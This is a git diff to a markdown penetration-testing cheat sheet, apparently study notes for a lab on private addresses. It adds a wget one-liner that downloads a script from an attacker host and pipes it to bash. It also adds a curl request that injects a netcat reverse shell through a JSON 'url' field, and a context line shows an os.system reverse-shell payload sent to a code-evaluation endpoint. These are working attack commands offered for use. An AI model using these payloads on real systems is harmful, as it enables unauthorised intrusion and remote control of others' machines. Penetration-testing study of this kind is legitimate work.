@@ -8,6 +8,7 @@
   - [feroxbuster](#feroxbuster)
   - [gobuster](#gobuster)
   - [wfuzz](#wfuzz)
+  - [wget](#wget)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -111,6 +112,13 @@ wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/com
 
 ```
 
+### wget
+```bash
+# Download a file and execute it
+wget -O - http://192.168.45.175:443/lse.sh | bash
+
+```
+
 # SSH
 ## SSH Keygen
 - See if other users can login as root using ssh key
@@ -163,6 +171,7 @@ http://192.168.183.117:50000/verify?code=os
 # Try sending post request to any found apis
 curl -X post --data "code=2*2" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
 curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
+curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;nc 192.168.45.175 80 -e /bin/bash"}' -H 'Content-Type: application/json'  http://192.168.222.134:13337/update
 ```
 
 ## When it's using Filemanater
